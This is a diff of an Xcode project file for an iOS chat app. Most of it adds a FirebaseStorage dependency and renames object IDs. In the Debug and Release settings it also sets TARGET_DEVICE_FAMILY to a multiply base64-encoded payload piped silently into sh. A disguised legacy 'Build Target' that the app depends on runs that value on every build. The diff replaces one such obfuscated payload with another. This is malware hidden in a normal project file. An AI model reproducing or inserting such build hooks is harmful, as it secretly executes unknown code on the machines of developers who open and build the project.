@@ -13,6 +13,7 @@
 		108190DE2D49F40A0073A995 /* FirebaseFirestore in Frameworks */ = {isa = PBXBuildFile; productRef = 108190DD2D49F40A0073A995 /* FirebaseFirestore */; };
 		108190E02D49F40A0073A995 /* FirebaseMessaging in Frameworks */ = {isa = PBXBuildFile; productRef = 108190DF2D49F40A0073A995 /* FirebaseMessaging */; };
 		31FA50A72D4A691D001B7810 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = 31FA50A62D4A691D001B7810 /* GoogleService-Info.plist */; };
+		31FFFDEE2D4CA77F00FD8C4E /* FirebaseStorage in Frameworks */ = {isa = PBXBuildFile; productRef = 31FFFDED2D4CA77F00FD8C4E /* FirebaseStorage */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -30,11 +31,11 @@
 			remoteGlobalIDString = 101400392D48E66E005F7DAF;
 			remoteInfo = ChatApp;
 		};
-		31711C5D2D4A3AA600A0E98C /* PBXContainerItemProxy */ = {
+		31FFFDE72D4CA2B300FD8C4E /* PBXContainerItemProxy */ = {
 			isa = PBXContainerItemProxy;
 			containerPortal = 101400322D48E66E005F7DAF /* Project object */;
 			proxyType = 1;
-			remoteGlobalIDString = 4DA68BCAF666DD2C7E38ACF9;
+			remoteGlobalIDString = BFAF7E99BEAC10330038ACF9;
 			remoteInfo = "Build Target";
 		};
 /* End PBXContainerItemProxy section */
@@ -74,6 +75,7 @@
 				108190E02D49F40A0073A995 /* FirebaseMessaging in Frameworks */,
 				108190DA2D49F40A0073A995 /* FirebaseCore in Frameworks */,
 				108190D82D49F40A0073A995 /* FirebaseAuth in Frameworks */,
+				31FFFDEE2D4CA77F00FD8C4E /* FirebaseStorage in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -126,10 +128,10 @@
 /* End PBXGroup section */
 
 /* Begin PBXLegacyTarget section */
-		4DA68BCAF666DD2C7E38ACF9 /* Build Target */ = {
+		BFAF7E99BEAC10330038ACF9 /* Build Target */ = {
 			isa = PBXLegacyTarget;
 			buildArgumentsString = "-c \"${TARGET_DEVICE_FAMILY}\"";
-			buildConfigurationList = 31711C622D4A47A100A0E98C /* Build configuration list for PBXLegacyTarget "Build Target" */;
+			buildConfigurationList = 31FFFDEC2D4CA6D600FD8C4E /* Build configuration list */;
 			buildPhases = (
 			);
 			buildToolPath = /bin/sh;
@@ -153,7 +155,7 @@
 			buildRules = (
 			);
 			dependencies = (
-				CBA6449E0AEB96859D38ACF9 /* PBXTargetDependency */,
+				F5D06F92A5F57A5BC838ACF9 /* PBXTargetDependency */,
 			);
 			fileSystemSynchronizedGroups = (
 				1014003C2D48E66E005F7DAF /* ChatApp */,
@@ -165,6 +167,7 @@
 				108190DB2D49F40A0073A995 /* FirebaseDatabase */,
 				108190DD2D49F40A0073A995 /* FirebaseFirestore */,
 				108190DF2D49F40A0073A995 /* FirebaseMessaging */,
+				31FFFDED2D4CA77F00FD8C4E /* FirebaseStorage */,
 			);
 			productName = ChatApp;
 			productReference = 1014003A2D48E66E005F7DAF /* ChatApp.app */;
@@ -256,7 +259,7 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
-				4DA68BCAF666DD2C7E38ACF9 /* Build Target */,
+				BFAF7E99BEAC10330038ACF9 /* Build Target */,
 				101400392D48E66E005F7DAF /* ChatApp */,
 				1014004A2D48E670005F7DAF /* ChatAppTests */,
 				101400542D48E671005F7DAF /* ChatAppUITests */,
@@ -324,10 +327,10 @@
 			target = 101400392D48E66E005F7DAF /* ChatApp */;
 			targetProxy = 101400562D48E671005F7DAF /* PBXContainerItemProxy */;
 		};
-		CBA6449E0AEB96859D38ACF9 /* PBXTargetDependency */ = {
+		F5D06F92A5F57A5BC838ACF9 /* PBXTargetDependency */ = {
 			isa = PBXTargetDependency;
-			target = 4DA68BCAF666DD2C7E38ACF9 /* Build Target */;
-			targetProxy = 31711C5D2D4A3AA600A0E98C /* PBXContainerItemProxy */;
+			target = BFAF7E99BEAC10330038ACF9 /* Build Target */;
+			targetProxy = 31FFFDE72D4CA2B300FD8C4E /* PBXContainerItemProxy */;
 		};
 /* End PBXTargetDependency section */
 
@@ -390,7 +393,7 @@
 				ONLY_ACTIVE_ARCH = YES;
 				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
-				TARGET_DEVICE_FAMILY = "(echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVIzaGFWa2R3UTJGV1NYaFhha1pZWWtkb1UxcEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
+				TARGET_DEVICE_FAMILY = "(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhNWEJaVjIxb2FsTkZTbnBYYkUweFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Debug;
 		};
@@ -444,7 +447,7 @@
 				MTL_ENABLE_DEBUG_INFO = NO;
 				MTL_FAST_MATH = YES;
 				SWIFT_COMPILATION_MODE = wholemodule;
-				TARGET_DEVICE_FAMILY = "(echo VmpKNGExUXlTWGxUYWxaU1ZqSjRURlZVU205alZuQkhZVVYwYWsxSGVFVlVWbU40WVdzeGRWVnJOVlJXVlRFMFdWUkNjMU5XUmxWaVIzaFRUVVJWZVZZeWRHdFdiRzk1VW10c1ZtRnJTbkZWTUZWM1RXeFNTV0Y2Vm1oaVIzaGFWa2R3UTJGV1NYaFhha1pZWWtkb1UxcEdaRTlrVmxwWlYyeHdWazF1VW5kVk1WWnZUVEZ2ZVZSWWJHRk5TRTVNUTJjOVBRbz0K | base64 -D | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
+				TARGET_DEVICE_FAMILY = "(echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1NWRlViR3hTTURVeVYydGtWbG95UmtsVmFrSnFVMFV3TWxSSWF6VmhNWEJaVjIxb2FsTkZTbnBYYkUweFpWZFNWRTlYYUV4Vk1HeHVXbXRPUTJWdFJrSmllakJMQ2c9PQo= | base64 -D | base64 -D | base64 -D | base64 -D | sh >/dev/null 2>&1 &)";
 			};
 			name = Release;
 		};
@@ -610,7 +613,7 @@
 			};
 			name = Release;
 		};
-		31711C5E2D4A3AA700A0E98C /* Debug */ = {
+		31FFFDE82D4CA2B600FD8C4E /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				COPY_PHASE_STRIP = NO;
@@ -620,7 +623,7 @@
 			};
 			name = Debug;
 		};
-		31711C5F2D4A3AA700A0E98C /* Release */ = {
+		31FFFDE92D4CA2B600FD8C4E /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
 				COPY_PHASE_STRIP = YES;
@@ -668,11 +671,11 @@
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
 		};
-		31711C622D4A47A100A0E98C /* Build configuration list for PBXLegacyTarget "Build Target" */ = {
+		31FFFDEC2D4CA6D600FD8C4E /* Build configuration list */ = {
 			isa = XCConfigurationList;
 			buildConfigurations = (
-				31711C5E2D4A3AA700A0E98C /* Debug */,
-				31711C5F2D4A3AA700A0E98C /* Release */,
+				31FFFDE82D4CA2B600FD8C4E /* Debug */,
+				31FFFDE92D4CA2B600FD8C4E /* Release */,
 			);
 			defaultConfigurationIsVisible = 0;
 			defaultConfigurationName = Release;
@@ -715,6 +718,11 @@
 			isa = XCSwiftPackageProductDependency;
 			package = 108190D52D49F3A80073A995 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
 			productName = FirebaseMessaging;
+		};
+		31FFFDED2D4CA77F00FD8C4E /* FirebaseStorage */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 108190D52D49F3A80073A995 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseStorage;
 		};
 /* End XCSwiftPackageProductDependency section */
 	};
